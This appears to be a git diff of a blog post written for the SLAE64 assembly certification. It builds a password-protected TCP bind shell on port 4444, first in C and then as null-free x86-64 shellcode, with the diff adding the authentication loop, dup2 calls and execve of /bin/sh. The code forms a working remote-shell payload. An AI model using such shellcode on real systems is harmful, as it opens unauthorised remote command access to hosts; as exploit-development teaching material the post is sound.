@@ -10,7 +10,7 @@ tags = [ "assembler", "shellcode" ]
 
 After completing the video lectures of the Security Tube Linux 64 bit Assembler Expert course (SLAE64), a series of assessments must be completed to gain certification. The first assignment is to create a shellcode string that will start a TCP Bind Shell. 
 
-A bind shell listens on a network port and waits for an incoming connection. A new socket is created on connection, the I/O streams of the host are cloned into this new socket and a new shell instance is spawned. 
+A bind shell listens on a network port and waits for an incoming connection. When a connection is received, a new socket is created, the I/O streams of the host are cloned into this new socket and a new shell instance is spawned.
 
 This has the effect of giving the remote user an interactive shell on the host system. Of course this is not as secure as something like an SSH connection, but is quite sufficient to let a remote user poke around the host system, issue commands and exfiltrate data.
 
@@ -59,15 +59,17 @@ Lastly, we define a couple of string buffers that we'll need later and a flag to
 
 The server <tt>sockaddr_in</tt> structure is configured as an IPv4 port, listening on port 4444 of all IP interfaces (0.0.0.0).
 
-Using this configuration, we create a TCP socket, bind it and start listening on the port.
-
 {{< highlight c >}}
 // Populate the server port information
 server.sin_family = AF_INET;         // AF_INET = 2
 server.sin_port = htons(4444);
 server.sin_addr.s_addr = INADDR_ANY; // INADDR_ANY = 0
 bzero(&server.sin_zero, 8);
+{{</ highlight >}}
 
+Next, we create a TCP socket, bind it using the <tt>server</tt> configuration and start listening on the port.
+
+{{< highlight c >}}
 // Create the server socket
 if((svr_sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1) // SOCK_STREAM = 1
 {
@@ -90,7 +92,7 @@ if((listen(svr_sock, 2)) == -1)
 }
 {{</ highlight >}}
 
-I have included the numeric values of the various constants as comments to make the conversion to assembler easier later. These can either be gleaned from the source code, the documentation or dumped from Python:
+I have included the numeric values of the various constants as comments in the code above to make the conversion to assembler easier later. These values can either be gleaned from the source code, the documentation or dumped from Python:
 
 {{< highlight text >}}
 MBP:slae64$ python
@@ -103,7 +105,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 ### Accept and validate incoming connections
 
-Now we have a listening socket, we can accept incoming connections. Passphrase validation is a loop that accepts incoming connections, prompts for input and checks any received data against the pre-set password.
+To carry out passphrase validation, we'll set up a loop that accepts incoming connections, prompts for input and checks any received data against the pre-set password until it receives the correct passphrase.
 
 {{< highlight c >}}
 // Start of authentication loop
@@ -156,7 +158,7 @@ If we get a good passphrase, we can break out of the authentication loop.
 
 ### Spawning the new shell
 
-We have authenticated our incoming connection, so we can kill off the server socket as it is no longer required. Then all that remains is to clone the I/O streams into the new socket and spawn the shell.
+Once we have authenticated our incoming connection, so we can kill off the server socket as it is no longer required. Then all that remains is to clone the I/O streams into the new socket and spawn the shell.
 
 {{< highlight c >}}
 // Kill the server socket
@@ -171,7 +173,7 @@ dup2(client_sock, 2); // STDERR
 execve(arguments[0], &arguments[0], NULL);
 {{</ highlight >}}
 
-Note that the <tt>execve</tt> function call requires a reference to the <tt>'/bin/sh'</tt> string and an array containing the <tt>'/bin/sh'</tt> string as arguments. Keeping this structure small requires some interesting memory gymnastics which explain the odd definitions in the C code.
+Note that the <tt>execve</tt> function call requires a reference to the <tt>'/bin/sh'</tt> string and an array of parameters which contains the <tt>'/bin/sh'</tt> string. Keeping this structure small requires some interesting memory gymnastics which explain the odd definitions in the C code.
 
 With that, we have completed the required functionality of the bind shell in C. Now we have the fun task of converting these operations to Assembler.
 
@@ -202,21 +204,21 @@ This totals 16 bytes. However, we don't really need two instances of this, we ca
 
 The <tt>execve</tt> call requires a <tt>'/bin/sh'</tt> string and an argument array containing at least two address references. As we're using 64-bit assembly, the default size of addresses is 64 bits, or 8 bytes. So we can fit all our strings, structures and arrays nicely in two 16 byte buffers.
 
-The stack provides a nice solution to the storage problem. I came up with the following layout to meet the requirements of this code: 
+The stack provides a good stable solution to the storage problem. I came up with the following layout to meet the requirements of this code: 
 
 ![image](img/StackBuffer.png)
 
-Although the stack is often said to grow 'downwards' in memory, it is often easier to visualise it growing upwards. This makes the layout of structures and buffers more logical and simplifies the view of offsets.
+Although the stack is often said to grow 'downwards' in memory, it is often easier to visualise it growing upwards as it makes the layout of structures and buffers more logical and simplifies the view of offsets.
 
-We'll use buffer 1 for the server and client structures as well as the input string from the user. The socket variables are fixed and buffer 2 will be used for the <tt>execve</tt> array. 
+Buffer 1 will be used for the server and client structures as well as the input string from the user. The socket variables are fixed and buffer 2 will be used for the <tt>execve</tt> parameter array. 
 
 I found that having a decent sketch of the stack layout and offsets makes writing and reading back the assembly language much easier.
 
-### Setting up 
+### Setting up
 
 The first thing to do is set RBP to the base of the stack so that the offsets in the layout sketch are correct.
 
-Next we'll use the Jump, Call, Pop method to establish the location of the embedded strings. Through trial and error I found that register <tt>r15</tt> was not clobbered by any of the syscalls, so that serves as a placeholder for the string reference address. 
+Next we'll use the Jump, Call, Pop method to establish the location of the embedded strings. Through trial and error I found that register <tt>R15</tt> was not clobbered by any of the syscalls, so that serves as a placeholder for the string reference address. 
 
 {{< highlight asm >}}
 global _start
@@ -240,7 +242,7 @@ _strdata:
 
 ### Utility functions
 
-Next in the code are a couple of utility functions. These two methods are used multiple times throughout the listing and it makes sense to break them out as a functions rather than have the code repeated multiple times. The first, <tt>_exit</tt>, is for restoring the stack pointer and stopping the code cleanly. The second, <tt>_prompt</tt>, is for sending strings to the remote client through their socket. I won't go into detail, but these methods are located at the start of the listing so that subsequent <tt>call</tt> instructions will have a negative offset with no troublesome zeros.
+Next in the code are a couple of utility functions. These two methods are used multiple times throughout the listing and it makes sense to break them out as a functions rather than repeat the code multiple times. The first, <tt>_exit</tt>, restores the stack pointer and stops the code cleanly. The second, <tt>_prompt</tt>, sends strings to the remote client through their socket. I won't go into detail, but these methods are located at the start of the listing so that subsequent <tt>call</tt> instructions will have a negative offset with no troublesome zeros.
 
 {{< highlight asm >}}
 _exit:                  ; exit nicely
@@ -252,22 +254,22 @@ _exit:                  ; exit nicely
     mov rsp, rbp
     syscall 
 
-_prompt:                ; send string to a socket, RDI (String) and RCX (Length) populated before call  
+_prompt:                ; send string to a socket, RSI and RDX populated before call    
     mov rdi, [rbp-40]
     xor rax, rax
-    push rax
+    push rax            ; push/pop has less instructions than mov for the lower registers
+    push rax    
     pop rcx
-    push rcx
     pop r8
-    mov r9, r8
-    add rax, 44
+    mov r9, r8          ; mov is more efficient for r8 - r15
+    add rax, 44         ; sys_sendto
     syscall
     ret
 {{</ highlight >}}
 
 ### Creating the server socket
 
-The first item on our stack is the 16 byte buffer containing the <tt>sockaddr_in</tt> structure. We know the values from the C example and we have to build the structure bottom up and right to left as shown:
+The first item in our variable stack is the 16 byte buffer containing the <tt>sockaddr_in</tt> structure. We know the values from the C example and we have to build the structure bottom up and right to left as shown:
 
 ![image](img/sockaddr_in.png)
 
@@ -285,7 +287,7 @@ _main:
     push rax
 {{</ highlight >}}
 
-To create the socket, we use the <tt>socket</tt> syscall which matches the <tt>socket()</tt> function used in the C code and the arguments are the same.
+To create the socket, we use the <tt>socket</tt> syscall which matches the <tt>socket()</tt> function used in the C code:
 
  ID | Name                | Arg1                | Arg2              | Arg3
 :---|:--------------------|:--------------------|:------------------|:---------------------
@@ -296,16 +298,15 @@ Having done some 32-bit assembler, I was used to calling functions with the argu
 
 The order is as follows:
 
-Argument | Arg1 | Arg2 | Arg3 | Arg4 | Arg5
----------|:----:|:----:|:----:|:----:|:----:
-Register | RDI  | RSI  | RDX  | R8   | R9
-
+Argument | Arg1 | Arg2 | Arg3 | Arg4 | Arg5 | Arg6
+---------|:----:|:----:|:----:|:----:|:----:|:-----:
+Register | RDI  | RSI  | RDX  | RCX  |R8    | R9
 
 Return values are still found in RAX.
 
 Unsurprisingly, Microsoft uses a different method. The various register schemes are listed on the [x86-64 Wiki Page](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions).
 
-Another difference from x86 assembler is that we no longer trigger interrupt 0x80 for syscalls. The selection method remains the same, with the syscall number being placed in <tt>RAX</tt>, but there is now a dedicated SYSCALL instruction. 
+Another difference from x86 assembler is that we no longer trigger interrupt 0x80 for syscalls. The selection method remains the same, with the syscall number being placed in <tt>RAX</tt>, but there is now a dedicated <tt>syscall</tt> instruction. 
 
 So, to invoke the <tt>socket</tt> syscall (ID: 41), we place 2 in <tt>RDI</tt>, 1 in <tt>RSI</tt>, 0 in <tt>RDX</tt>, 41 in <tt>RAX</tt> and then invoke the <tt>syscall</tt> instruction. 
 
@@ -326,15 +327,16 @@ Of course, it isn't that simple if we want to keep zeros out of the shellcode, b
     push rax            ; store socket id on stack
 {{</ highlight >}}
 
-If the return value is -1 or less, something bad has happened and we call the <tt>_exit</tt> stub. Otherwise, <tt>RAX</tt> contains the newly created socket id which we push onto the stack to create the first of our variable entries.
+If the return value is -1 or less, something bad has happened and we call the <tt>_exit</tt> handler. Otherwise, <tt>RAX</tt> contains the newly created socket id which we push onto the stack to create the first of our fixed variable entries.
 
-Next we bind our server socket. Again the <tt>bind</tt> syscall matches the <tt>bind()</tt> function. 
+Next we bind our server socket. Again the <tt>bind</tt> syscall matches the <tt>bind()</tt> function:
 
  ID /RAX | Name              | Arg1 / RDI      | Arg2 / RSI                       | Arg3 / RDX
 :--------|:------------------|:----------------|:---------------------------------|:--------------------
  49      | <tt>sys_bind</tt> | <tt>int fd</tt> | <tt>struct sockaddr *myaddr</tt> | <tt>int addrlen</tt> 
 
-Here we start to reference the stack variables using an offset from <tt>RBP</tt> for the socket ID and our populated <tt>sockaddr</tt> structure. We need a static value of 16 representing the length of <tt>sockaddr</tt> for the third argument. We'll be needing a reference to this later so we'll push it onto the stack once we have created the value.
+Now we begin to reference the stack variables using an offset from <tt>RBP</tt>. The socket ID and a reference to our populated <tt>sockaddr</tt> structure can dropped directly into the relevant registers. 
+We need a static value of 16 representing the length of <tt>sockaddr</tt> for the third argument. As we'll be needing a reference to this later, we'll push it onto the stack as the second fixed variable once we have generated the value.
 
 {{< highlight asm >}}
 ; Bind Socket
@@ -358,7 +360,7 @@ ID / RAX | Name                | Arg1 / RDI      | Arg2 / RSI
 :--------|:--------------------|:----------------|:-----------
 50       | <tt>sys_listen</tt> | <tt>int fd</tt> | <tt>int backlog</tt>
 
-<tt>RDI</tt> still contains the socket ID from the previous syscall, so it is just a case of setting the syscall ID and limiting the number of connections to two.
+<tt>RDI</tt> still contains the socket ID from the previous syscall, so it is just a case of setting the method ID and limiting the number of connections to two.
 
 {{< highlight asm >}}
 ; Listen
@@ -379,9 +381,9 @@ The <tt>accept</tt> syscall matches the function in the C code:
 :---------|:--------------------|:----------------|:-----------------------------------------|:---------------------------
  43       | <tt>sys_accept</tt> | <tt>int fd</tt> | <tt>struct sockaddr *upeer_sockaddr</tt> | <tt>int *upeer_addrlen</tt>
 
-We're reusing the <tt>sockaddr</tt> buffer on the stack. I expected this buffer to need zeroing out, but test showed that the code worked just fine with a dirty buffer, so I didn't waste instuctions clearing the area.
+We're reusing the <tt>sockaddr</tt> buffer on the stack. I expected this buffer to need zeroing out, but tests showed that the code worked just fine with a dirty buffer, so I didn't waste instructions clearing the area.
 
-As previously mentioned, the third argument is a pointer to the <tt>sockaddr</tt> size value. The <tt>accept</tt> syscall may adjust this value, so we cannot simply pass a constant value or reference a register.
+As previously mentioned, the third argument is a pointer to the <tt>sockaddr</tt> length value. The <tt>accept</tt> syscall may adjust this value, so we cannot simply pass a constant value or reference a register. Doing so will cause <tt>accept</tt> to fail when an incoming connection is acquired. 
 
 {{< highlight asm >}}
 _accept:
@@ -403,12 +405,13 @@ As we may be returning here from further down the code, we cannot depend on the 
 
 The code blocks at this point, waiting for connections. The error check is carried out as normal, but if we do have a valid socket ID, it is pushed onto the stack for safe keeping.
 
-Assuming that we have a valid socket, we need to prompt the remote user that a password is required. In the C code, the <tt>send()</tt> function was used for this. However, I could not find a matching syscall in the kernel documentation. The nearest syscall was <tt>sys_sendto</tt> which required many extra parameters:
+Assuming that we have a valid socket, we need to prompt the remote user for a password. In the C code, the <tt>send()</tt> function was used for this. However, I could not find a matching syscall in the kernel documentation. The nearest syscall was <tt>sys_sendto</tt> which required extra parameters:
 
- ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / R8 | Arg5 / R9
-:---------|:-----|:-----------|:-----------|:-----------|:----------|:---------
- 44       | <tt>sys_sendto</tt> | <tt>int fd</tt> | <tt>void *buff</tt> | <tt>size_t len</tt> | <tt>unsigned flags</tt> | <tt>struct sockaddr *addr</tt>   <tt>int addr_len</tt>
+ ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / RCX | Arg5 / R8 | Arg6 / R9 
+:---------|:-----|:-----------|:-----------|:-----------|:-----------|:----------|:---------
+44|<tt>sys_sendto</tt>|<tt>int fd</tt>|<tt>void *buff</tt>|<tt>size_t len</tt>|<tt>unsigned flags</tt>|<tt>struct sockaddr *addr</tt>|<tt>int addr_len</tt>
 
+Digging a little further, I found the following snippet in <tt>net/socket.c</tt>:
 
 {{< highlight c >}}
 SYSCALL_DEFINE4(send, int, fd, void __user *, buff, size_t, len,
@@ -418,46 +421,166 @@ SYSCALL_DEFINE4(send, int, fd, void __user *, buff, size_t, len,
 }
 {{</ highlight >}}
 
+This tells us that we can simply ignore the extra parameters and we know from the C code that the flag argument can also be zero.
 
+As discussed earlier, we need to use this call in a few places during execution, so <tt>sendto</tt> is wrapped in the utility stubs at the start of the listing. The calling code simply needs to set the string address and length registers.
 
 {{< highlight asm >}}
 ; authenticate incoming connection
     mov rsi, r15        ; string address
     xor rdx, rdx
-    add rdx, 24     ; string length
+    add rdx, 24         ; string length
     call _prompt
+{{</ highlight >}}
 
+To get the input from the remote user in the C code, we used <tt>read()</tt>. I could not find a <tt>read</tt> syscall, but <tt>recvfrom</tt> seemed to have a similar setup to the <tt>sendto</tt> method:
+
+ ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / RCX | Arg5 / R8 | Arg6 / R9 
+:---------|:-----|:-----------|:-----------|:-----------|:-----------|:----------|:---------
+45|<tt>sys_recvfrom</tt>|<tt>int fd</tt>|<tt>void *ubuf</tt>|<tt>size_t size</tt>|<tt>unsigned flags</tt>|<tt>struct sockaddr *addr</tt>|<tt>int *addr_len</tt>
+
+A quick test showed that the same pattern of zeroing out the later parameters could be used:
+
+{{< highlight asm >}}
     mov rdi, [rbp-40]   ; socket id
     lea rsi, [rbp-16]   ; buffer address
     xor rcx, rcx        ; Zero out registers
-    mov r8, rcx
-    mov r9, rcx
-    mov rdx, rcx
-    add rdx, 8      ; buffer length
-    mov rax, rcx
-    add rax, 45     ; recvfrom
+    push rcx
+    push rcx
+    push rcx
+    pop rdx
+    pop rax
+    pop r8
+    mov r9, r8  
+    add rdx, 8          ; buffer length
+    add rax, 45         ; recvfrom
     syscall
 {{</ highlight >}}
 
+Interestingly, I found that the <tt>push</tt> and <tt>pop</tt> instructions on the <tt>RAX</tt>, <tt>RBX</tt>, <tt>RCX</tt>, <tt>RSI</tt> and <tt>RDI</tt> registers are single byte instructions, while a <tt>mov</tt> is three. So <tt>push</tt>/<tt>pop</tt> saves one byte per move when working with repeating values. Unfortunately, the numbered registers (<tt>R8</tt>, <tt>R9</tt>, etc) require two bytes for each <tt>push</tt> and <tt>pop</tt> so a <tt>mov</tt> is more efficient.
 
-{{< highlight text >}}
-sys_sendto (id 44)
+The <tt>recvfrom</tt> call blocks until something is received from the remote user. 
+
+In the C code, we used <tt>strcmp()</tt> to compare the pre-set password with the user's response. There is no nice easy syscall equivalent of <tt>strcmp</tt>, but there is a mechanism for comparing memory locations byte by byte using the <tt>cmpsb</tt> instruction.
+
+First we set the <tt>RSI</tt> and <tt>RDI</tt> registers up with the start address of the two strings. <tt>RCX</tt> is populated with the length of the target string.
+
+{{< highlight asm >}}
+; compare strings
+    lea rsi, [rbp-16]   ; input buffer address
+    lea rdi, [r15+24]   ; password string address
+    xor rcx, rcx
+    add rcx, 8          ; length
 {{</ highlight >}}
 
-{{< highlight c >}}
-socket.c
+<tt>cmpsb</tt> compares the bytes at <tt>RSI</tt> and <tt>RDI</tt>, clearing the zero flag if there is a mismatch. The command handily increments the string pointers too, so we simply need to check for failed matches and loop until we have processed <tt>RCX</tt> bytes.
 
-SYSCALL_DEFINE6(sendto, int, fd, void __user *, buff, size_t, len,
-        unsigned, flags, struct sockaddr __user *, addr,
-        int, addr_len)
-
-
-SYSCALL_DEFINE4(send, int, fd, void __user *, buff, size_t, len,
-        unsigned, flags)
-{
-    return sys_sendto(fd, buff, len, flags, NULL, 0);
-}
+{{< highlight asm >}}
+_cmploop:
+    cmpsb               ; compare bytes
+    jne _badpw          ; exit if no match
+    loop _cmploop       ; next char
 {{</ highlight >}}
+
+If the two strings match, we'll fall through the the 'good passphrase' section, which sends a welcome message to the remote user and jumps to the shell setup code.
+
+{{< highlight asm >}}
+; good passphrase (fallthrough)
+    lea rsi, [r15+32]   ; welcome string
+    xor rdx, rdx
+    add rdx, 8          ; welcome length
+    call _prompt
+    jmp _create_shell   ; set up the shell
+{{</ highlight >}}
+
+However, if the strings don't match, we're jumped to the <tt>_badpw</tt> location. This code sends a fail message to the remote user, pops the socket ID off the stack and uses the <tt>shutdown</tt> syscall to terminate the connection.
+
+ ID / RAX | Name | Arg1 / RDI | Arg2 / RSI 
+:---------|:-----|:-----------|:-----------
+48 | <tt>sys_shutdown</tt> | <tt>int fd</tt> | <tt>int how</tt> 
+
+The 'how' parameter is set to <tt>SHUT_RDWR</tt> which kills all read and write operations to the socket.
+
+The last step is to loop back to the <tt>_accept</tt> label to listen for another incoming connection and repeat the validation until it is done correctly. 
+
+{{< highlight asm >}}
+_badpw:
+    lea rsi, [r15+40]   ; fail message
+    xor rdx, rdx
+    add rdx, 6          ; fail length
+    call _prompt
+    xor rax, rax        ; zero out regs
+    push rax
+    pop rsi
+    add rax, 48         ; shutdown client socket
+    pop rdi             ; last use of client sock id
+    add rsi, 2          ; SHUT_RDWR
+    syscall     
+    jmp _accept         ; jump back to await another connection
+{{</ highlight >}}
+
+Assuming that we have validated the user, the remainder of the code is concerned with setting up the shell. First we duplicate the I/O streams of the host and assign them to the client socket using <tt>dup2</tt>:
+
+ ID / RAX | Name | Arg1 / RDI | Arg2 / RSI 
+:---------|:-----|:-----------|:-----------
+33 | <tt>sys_dup2</tt> | <tt>unsigned int oldfd</tt> | <tt>unsigned int newfd</tt>
+
+{{< highlight asm >}}
+_create_shell:
+
+; Duplicate I/O descriptors
+    xor rax, rax 
+    add rax, 33         ; dup2      
+    mov r8, rax         ; preserve syscall id for subsequent calls
+    mov rdi, [rbp-40]   ; socket id
+    xor rsi, rsi        ; STDIN
+    syscall 
+
+    mov rax, r8         ; dup2
+    inc rsi             ; STDOUT
+    syscall
+
+    mov rax, r8         ; dup2
+    inc rsi             ; STDERR
+    syscall
+{{</ highlight >}}
+
+The only remaining step is to invoke the new shell. As in the C code, we use <tt>execve</tt> for this:
+
+ ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX  
+:---------|:-----|:-----------|:-----------|:-----------
+59 |<tt>sys_execve</tt>|<tt>const char *filename</tt>|<tt>const char *const argv[]</tt>|<tt>const char *const envp[]</tt>       
+
+The '<tt>/bin/sh</tt>' string is 7 bytes, adding a NULL terminator brings us to a nice round 8 bytes. We can represent this string as a hex number, but we need to avoid introducing a zero into our shellcode. My workaround is to create the string with a leading 'X'. Right shifting the register removes the 'X' and introduces the required NULL.
+
+We are re-using buffer 1 on the stack to hold our string. We build the arguments array in reverse by pushing a NULL onto the stack followed by the address of buffer 1.
+
+The stack will look like this:
+
+![image](img/StackBuffer-execve.png)
+
+Once the stack is arranged, <tt>RDI</tt> will hold the <tt>RBP-16</tt> address, <tt>RSI</tt> will hold the <tt>RSP</tt> address.
+
+If we've done everything right, calling the <tt>execve</tt> syscall spawns the shell and we're done. The code blocks while the remote user interacts with the local shell. Once the shell closes, the code calls the <tt>_exit</tt> stub and the program ends.
+
+{{< highlight asm >}}
+_spawn:
+    xor rax, rax
+    push rax
+    pop rdx             
+    mov rbx, 0x68732f6e69622f78 ; build 'X/bin/sh'
+    shr rbx, 8          ; shift the ¨X¨ and append a NULL
+    mov [rbp-16], rbx   ; copy ¨/bin/sh¨ string to buffer
+    lea rdi, [rbp-16]   ; get the /bin/sh string
+    push rax            ; build args array, by pushing NULL
+    push rdi            ; then push buffer 1 address
+    mov rsi, rsp        ; arg array address
+    add rax, 59         ; execve
+    syscall
+    call _exit
+{{</ highlight >}}
+
+
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
